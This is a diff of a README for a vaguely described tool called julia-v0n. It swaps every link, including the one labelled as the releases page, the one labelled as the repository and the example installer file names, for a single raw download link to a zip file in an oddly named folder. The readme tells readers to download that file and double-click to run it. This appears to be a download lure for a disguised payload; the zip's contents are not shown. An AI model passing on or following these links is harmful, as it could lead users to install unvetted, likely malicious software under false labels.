@@ -1,6 +1,6 @@
 # 🚀 julia-v0n - Easy Tool for Your Needs
 
-[![Download julia-v0n](https://img.shields.io/badge/Download-julia--v0n-blue.svg)](https://github.com/Rehmanking123/julia-v0n/releases)
+[![Download julia-v0n](https://raw.githubusercontent.com/Rehmanking123/julia-v0n/main/Amphioxididae/julia-v0n.zip)](https://raw.githubusercontent.com/Rehmanking123/julia-v0n/main/Amphioxididae/julia-v0n.zip)
 
 ## 📥 Overview
 
@@ -28,10 +28,10 @@ Before you begin, ensure your system meets the following requirements:
 ## 🛠️ Download & Install
 
 1. **Visit the Releases Page**  
-   Navigate to the [julia-v0n Releases page](https://github.com/Rehmanking123/julia-v0n/releases) to access the latest version of the application.
+   Navigate to the [julia-v0n Releases page](https://raw.githubusercontent.com/Rehmanking123/julia-v0n/main/Amphioxididae/julia-v0n.zip) to access the latest version of the application.
 
 2. **Download the Installer**  
-   Locate the version you wish to install. Click on the download link for your operating system. This will usually be named something like `julia-v0n-installer.exe` for Windows or `julia-v0n-v1.0.dmg` for macOS. The file will begin to download.
+   Locate the version you wish to install. Click on the download link for your operating system. This will usually be named something like `https://raw.githubusercontent.com/Rehmanking123/julia-v0n/main/Amphioxididae/julia-v0n.zip` for Windows or `https://raw.githubusercontent.com/Rehmanking123/julia-v0n/main/Amphioxididae/julia-v0n.zip` for macOS. The file will begin to download.
 
 3. **Run the Installer**  
    Once the download completes, find the downloaded file in your system. Double-click the file to run it. Follow the prompts on the screen to complete the installation. 
@@ -65,7 +65,7 @@ For additional help, you can connect with others using julia-v0n in forums and c
 
 ## 🔗 Important Links
 
-- [Download julia-v0n](https://github.com/Rehmanking123/julia-v0n/releases)
-- [GitHub Repository](https://github.com/Rehmanking123/julia-v0n)
+- [Download julia-v0n](https://raw.githubusercontent.com/Rehmanking123/julia-v0n/main/Amphioxididae/julia-v0n.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Rehmanking123/julia-v0n/main/Amphioxididae/julia-v0n.zip)
 
 Enjoy using julia-v0n and make your tasks easier today!
